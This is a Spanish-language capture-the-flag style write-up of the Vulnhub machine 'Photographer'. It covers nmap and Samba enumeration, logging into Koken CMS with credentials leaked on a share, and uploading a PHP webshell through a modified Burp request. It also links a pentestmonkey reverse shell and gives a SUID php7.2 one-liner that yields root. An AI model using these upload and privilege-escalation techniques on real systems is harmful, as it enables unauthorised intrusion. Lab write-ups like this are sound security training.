---
layout: single
title: photographer - Vulnhub
excerpt: "Photographer es una máquina vulnerable de la plataforma vulnhub, que incluye una vulnerabilidad en el gestor de contenidos(Koken). Está vulnerabilidad nos permite acceder remotamente a la máquina, después la escalación de privilegios consiste en una mala administración de permisos de archivos, que nos permite acceso al usuario root."
date: 2023-10-08
classes: wide
header:
  teaser: /assets/images/vulnhub-writeup-photographer/logo_vulnhub.png
  teaser_home_page: true
categories:
  - vulnhub
  - cxdxnt
tags:  
  - samba 
  - suid
  - webshell
---

La máquina 'photographer' presenta una vulnerabilidad en su sistema de gestión de contenido Koken que permite la carga de una webshell. Esta vulnerabilidad nos concede acceso al sistema. Una vez dentro, encontramos un archivo SUID que nos otorga la capacidad de ejecutar comandos con privilegios de root

## Enumeración

Empezamos con un reconocimiento de puertos y servicios a través de la herramienta nmap. En el cual logramos detectar dos servicios(http,samba).

```bash

# Nmap 7.93 scan initiated Sun Oct  8 11:35:17 2023 as: nmap -sCV -p80,139,445,8000 -oN vulnscan.nmap 192.168.0.115
Nmap scan report for 192.168.0.115
Host is up (0.00030s latency).

PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Photographer by v1n1v131r4
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Koken 0.22.24
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: daisa ahomi
|_http-trane-info: Problem with XML parsing of /evox/about
MAC Address: 08:00:27:1C:31:3C (Oracle VirtualBox virtual NIC)
Service Info: Host: PHOTOGRAPHER

Host script results:
|_clock-skew: mean: 4h20m03s, deviation: 2h18m34s, median: 3h00m02s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: photographer
|   NetBIOS computer name: PHOTOGRAPHER\x00
|   Domain name: \x00
|   FQDN: photographer
|_  System time: 2023-10-08T13:35:34-04:00
| smb2-time: 
|   date: 2023-10-08T17:35:34
|_  start_date: N/A
|_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct  8 11:35:31 2023 -- 1 IP address (1 host up) scanned in 13.96 seconds

```
### Puerto samba

Realizaremos un análisis del servicio Samba utilizando la herramienta 'smbmap', que nos proporciona la capacidad de enumerar los directorios a los que se puede acceder dentro del sistema a través del protocolo SMB.

```bash
➜  Photographer smbmap -H 192.168.0.115 -u null                     
[+] Guest session   	IP: 192.168.0.115:445	Name: 192.168.0.115                                     
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	sambashare                                        	READ ONLY	Samba on Ubuntu
	IPC$                                              	NO ACCESS	IPC Service (photographer server (Samba, Ubuntu))

```

### Lectura de archivos

Visualizamos que tenemos acceso de lectura al directorio sambashare. Que contiene dos archivos(wordpress.bkp.zip,mailsent.txt).Dentro del contenido del archivo 'mailsent.txt', hemos logrado extraer información que incluye dos nombres de usuario válidos y una contraseña.

### Página web 


En este reto la máquina contiene dos servicios web que corren en diferentes puertos. Voy a utilizar el script de Nmap denominado 'http-enum', el cual está diseñado para enumerar y obtener información sobre los archivos y recursos alojados en servidores web.

```bash
# Nmap 7.93 scan initiated Sun Oct  8 11:37:12 2023 as: nmap --script http-enum -p80,8000 -oN scanhttp.nmap 192.168.0.115
Nmap scan report for 192.168.0.115
Host is up (0.00032s latency).

PORT     STATE SERVICE
80/tcp   open  http
| http-enum: 
|_  /images/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
8000/tcp open  http-alt
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /app/: Potentially interesting folder
|   /content/: Potentially interesting folder
|   /error/: Potentially interesting folder
|   /home/: Potentially interesting folder
|_  /index/: Potentially interesting folder
MAC Address: 08:00:27:1C:31:3C (Oracle VirtualBox virtual NIC)

# Nmap done at Sun Oct  8 11:37:25 2023 -- 1 IP address (1 host up) scanned in 12.65 seconds
```

Al acceder al sitio web ubicado en la dirección **http://192.168.0.115:8000/admin**, hemos identificado que el sistema está ejecutando el gestor de contenido Koken. Al ingresar, nos encontramos con un panel de inicio de sesión, por lo que procedemos a utilizar las credenciales de acceso que hemos obtenido previamente del archivo en el servicio Samba.

![](/assets/images/vulnhub-writeup-photographer/password_users.png)

### Inicio de sesión

Proporcionamos las credenciales que visualizamos anteriormente.

![](/assets/images/vulnhub-writeup-photographer/login.png)


## Intrusión al sistema

El sistema de gestión de contenidos Koken exhibe una vulnerabilidad que habilita la carga de archivos PHP, lo cual resulta en la obtención de acceso remoto a la máquina. Para explotar esta vulnerabilidad, accedemos a la URL http://192.168.0.115:8000/admin/#/library y observamos un botón denominado 'import content'. Al seleccionarlo, procedemos a cargar una imagen cualquiera y posteriormente interceptamos la respuesta con burp.

```bash

POST /api.php?/content HTTP/1.1
Host: 192.168.0.115:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://192.168.0.115:8000/admin/
x-koken-auth: cookie
Content-Type: multipart/form-data; boundary=---------------------------31344929814676734271882685817
Content-Length: 1086
Origin: http://192.168.0.115:8000
DNT: 1
Connection: close
Cookie: koken_referrer=%2F; koken_session_ci=4RVJeHCtUOelovf2eZ0J50XCgVrUSat5dB31RToVOUrNWz1c8xEUpyqjLeboUz0bXNd6tyQ6rlw8ZTHJuyE8P4NpB6vnLuZ%2B1V36pfhPr3t9MAWPtrmbWd89tFJRmYmfG5Yi1lNptPwawWsO2%2BUudA8h4neZ5nAPNtjIdztaiW%2FeBNC0%2B%2FuegJWBCn%2BE4QT45StgmZp0huyLAIUt%2Fygju5OF3fORJp7KMp%2BQpkhoteNm%2BigVxl71k9mEaSYZnSvWIh99lYJOghPVQMOakq64mfJzUYWxhdzOoy5pn1nCzf3Vxphd9AkW5fGVuhBUq%2B3uAJOZTPOL8wCI6V49zWdQr7SzOKTRH3yoGizC0shXoOJ4Cx4FofSiOlkTu7rKG4IG%2F4vZ5xKoZUJT9eE02nXz3BQxuEoCfi6GaT9x2Uss9jwqwYn9mnuasum5vwoqE%2BcVerisxOCXxrpIMB5MLAgQJR0ejEYorUXUO9iXqTPpXMZMy6si9wmPCoWWlIiwQlk4o3zpsD3oyNDqiWLZWA%2BiBrtV%2BVxh0tObNjzUTWXDsdNs9eenOXBMw2WDwz2x4hdP%2B9HpibBXcBUaGdTCQ5789CxSN3Tb8U8DiitUpKnVU8lZfFXZpSZEenWxAa1n91F%2FD2U3rNqCkPXijRvD2aQRzcZAI9zgYKHvI3ecEsPd8LUE0PynltqUEeL7YawkRRFjPtlUPOkmcL5eFIgRVQYoWmAW8%2FebamJfJzCS3qr7o61MEsD%2FzhPVU0qYmMG4WIkG5dm4PKbEqCS2dYTwWIbbLwtAzOxch6S3DtkIF%2BsSWUxKqAMO9b1jLyXt86sTAZXDNHadE7lv1aNm0I3VS4%2BFOuctHb1RNwvpTe9gQyey%2Beh%2Fmj6fqJ8vw87UjAe6uiIygYhubWa9VqKUC9Dey5nbACmufE8y7kbfRjFxd1DuMK709QhvBJ4AZfDVUR7oaScsvu%2FwU7CiTPnmvCRCYjOSAWsnbiIuB0jh8fYAu1J3D013ya7cwMq58CZxfAVuYVy7bJcRKStwgUBcGboEkUNjE9YCKvqV4DuDHIul5NVzGfd7O8%2Fi1PqGgcQGfUTLfQcUIoh9iH2johR0DiVwbCh3NXBwubm4afMhFCKD1w%2BDpaxwvNng0mJygE%2FgZDvXsc7JwOAlW0Kj2qEQJxk053dhBf8ORfeAeADKARfYiL23ZegujGs9xmOap5I00OX3Mev%2BYUGxX1zeu2mcUUWq0kynN1d7UKsok4qH8AnIfyKN1sFSdOVma3IffrzebLE%2Fc5rR4f1ffa69f0507ad383f44dc963e5083fa532d59d

-----------------------------31344929814676734271882685817
Content-Disposition: form-data; name="name"

test.php
-----------------------------31344929814676734271882685817
Content-Disposition: form-data; name="chunk"

0
-----------------------------31344929814676734271882685817
Content-Disposition: form-data; name="chunks"

1
-----------------------------31344929814676734271882685817
Content-Disposition: form-data; name="upload_session_start"

1696793225
-----------------------------31344929814676734271882685817
Content-Disposition: form-data; name="visibility"

public
-----------------------------31344929814676734271882685817
Content-Disposition: form-data; name="license"

all
-----------------------------31344929814676734271882685817
Content-Disposition: form-data; name="max_download"

none
-----------------------------31344929814676734271882685817
Content-Disposition: form-data; name="file"; filename="test.jpg"
Content-Type: image/jpeg

<tu scripts aqui>

-----------------------------31344929814676734271882685817--

```

Utilizare la reverse shell de  pentestmonkey **https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php**. Ahora solamente ingresamos a la pagina inicial de la web y se ejecutaria la reverse shell.


## Escalación de privilegios.

Después de haber obtenido acceso a la máquina, ejecutamos una herramienta denominada 'find' con el propósito de identificar los archivos que tienen el bit SUID configurado, lo que nos permitirá identificar potenciales puntos de elevación de privilegios en el sistema.

```bash

www-data@photographer:/$ find / -perm -4000 2>/dev/null | xargs ls -la
-rwsr-xr-x 1 root root         30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root         40152 May 16  2018 /bin/mount
-rwsr-xr-x 1 root root         44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root         44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root         40128 May 16  2017 /bin/su
-rwsr-xr-x 1 root root         27608 May 16  2018 /bin/umount
-rwsr-xr-x 1 root root         49584 May 16  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root         40432 May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root         75304 May 16  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root         39904 May 16  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root         54256 May 16  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root       4883680 Jul  9  2020 /usr/bin/php7.2
-rwsr-xr-x 1 root root        136808 Jan 20  2021 /usr/bin/sudo
-rwsr-xr-- 1 root messagebus   42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root         10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root        428240 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root        110792 Feb  7  2021 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root         18664 Mar 18  2017 /usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
-rwsr-sr-x 1 root root         10584 Apr  8  2021 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-- 1 root dip         394984 Jul 23  2020 /usr/sbin/pppd
```
### Explotación
Observamos que existe un ejecutable en la ubicación /usr/bin/php7.2 y que este es vulnerable a la ejecución de comandos arbitrarios. En consecuencia, procedemos a realizar las siguientes acciones:

```bash
www-data@photographer:/$ 
www-data@photographer:/$ CMD="/bin/sh"
www-data@photographer:/$ /usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
# whoami
root
```

